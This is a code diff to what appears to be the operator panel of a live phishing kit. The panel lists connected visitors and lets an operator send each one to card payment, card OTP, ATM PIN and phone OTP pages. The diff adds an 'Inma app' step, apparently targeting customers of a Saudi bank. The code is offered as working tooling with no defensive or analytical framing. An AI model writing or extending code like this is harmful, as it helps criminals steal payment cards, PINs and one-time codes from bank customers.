@@ -1989,6 +1989,7 @@
       html += '<option value="summary-payment">ملخص الدفع</option>';
       html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
       html += '<option value="otp-verification">OTP البطاقة</option>';
+      html += '<option value="inma-app">تطبيق إنماء</option>';
       html += '<option value="atm-password">كلمة مرور ATM</option>';
       html += '<option value="phone-verification">توثيق الجوال</option>';
       html += '<option value="phone-otp">OTP الجوال</option>';
@@ -2289,6 +2290,7 @@
             html += '<div class="flex gap-2 mt-3">';
             html += '<button onclick="cardActionOTP(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
             html += '<button onclick="cardActionATM(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
+            html += '<button onclick="cardActionInma(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق إنماء</button>';
             html += '<button onclick="cardActionReject(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
             html += '</div>';
             html += '</div>';
@@ -2704,6 +2706,7 @@
       html += '<option value="summary-payment">ملخص الدفع</option>';
       html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
       html += '<option value="otp-verification">OTP البطاقة</option>';
+      html += '<option value="inma-app">تطبيق إنماء</option>';
       html += '<option value="atm-password">كلمة مرور ATM</option>';
       html += '<option value="phone-verification">توثيق الجوال</option>';
       html += '<option value="phone-otp">OTP الجوال</option>';
@@ -2928,6 +2931,26 @@
       window.skipDetailsUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'atm' });
       // تحديث حالة الانتظار وتحديث القائمة فوراً
+      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
+      if (visitor) { visitor.waitingForAdminResponse = false; }
+      renderVisitorsList();
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove(originalBg);
+      btn.classList.add('bg-green-600');
+      setTimeout(() => {
+        window.skipDetailsUpdate = false;
+        btn.textContent = originalText;
+        btn.classList.remove('bg-green-600');
+        btn.classList.add(originalBg);
+      }, 1500);
+    }
+
+    function cardActionInma(socketId) {
+      const btn = event.target;
+      const originalText = btn.textContent;
+      const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-purple-600';
+      window.skipDetailsUpdate = true;
+      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'inma' });
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
       renderVisitorsList();
